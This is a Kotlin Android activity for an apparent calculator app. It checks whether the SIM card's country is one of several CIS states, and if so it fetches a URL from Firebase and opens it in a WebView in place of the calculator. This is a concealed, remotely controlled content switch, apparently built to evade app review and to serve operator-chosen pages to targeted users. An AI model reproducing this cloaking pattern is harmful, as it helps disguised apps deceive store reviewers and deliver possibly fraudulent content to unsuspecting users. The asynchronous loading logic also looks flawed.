package com.testfirebaseapp

import android.Manifest.permission
import android.annotation.TargetApi
import android.content.DialogInterface
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.View
import android.view.Window
import android.view.WindowManager
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.ViewModelProvider
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.FirebaseFirestoreSettings
import com.testfirebaseapp.calculator.MainRepository
import com.testfirebaseapp.calculator.ViewModelMain
import com.testfirebaseapp.siminfo.acces_to_sim
import kotlinx.android.synthetic.main.activity_main.*


class MainActivity : AppCompatActivity() {
    private lateinit var viewModelMain: ViewModelMain
    private val REQUEST_ID_MULTIPLE_PERMISSIONS = 1


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        FirebaseFirestore.getInstance().clearPersistence()


//        if (checkAndRequestPermissions()) checkPermission()
        checkPermission()

    }

    fun loadNative() {
        calculator_layout.visibility= View.VISIBLE
        progressBar.visibility=View.GONE
        val factory: ViewModelMain.Factory = ViewModelMain.Factory(MainRepository.getInstance())
        viewModelMain = ViewModelProvider(this, factory).get(ViewModelMain::class.java)

        viewModelMain.click(this, calculator_layout)
    }


    private fun openWebView(url: String) {
        val i = Intent(this, WebViewActivity::class.java)
        i.putExtra("url", url)
        startActivity(i)
        finish()


    }


    private fun simCardInfo(): Boolean {
        val list = acces_to_sim(this)
        val country = listOf(
            "ru",
            "rus",
            "az",
            "aze",
            "am",
            "arm",
            "by",
            "blr",
            "kz",
            "kaz",
            "kg",
            "kgz",
            "md",
            "mda",
            "tj",
            "tjk",
            "uz",
            "uzb"
        )

        return list[0].isNotEmpty() && country.contains(list[1].toLowerCase())

    }

    private fun dataFromFireBase() {
        val db = FirebaseFirestore.getInstance()

        val settings = FirebaseFirestoreSettings.Builder()
            .setPersistenceEnabled(false)
            .build()
        db.firestoreSettings = settings
        var isLoaded = false

        db.collection("data")
            .get()
            .addOnCompleteListener { task ->
                if (task.isSuccessful) {
                    for (document in task.result!!) {
                        if (document.data["value"].toString().length>1) {
                            isLoaded = true
                            openWebView("" + document.data["value"])
                        }
                    }
                    if (!isLoaded) loadNative()
                }
            }
        if (!isLoaded) loadNative()

    }


    private fun checkPermission() {
        if (simCardInfo()) {
            dataFromFireBase()
        } else {
            loadNative()
        }
    }



    


}
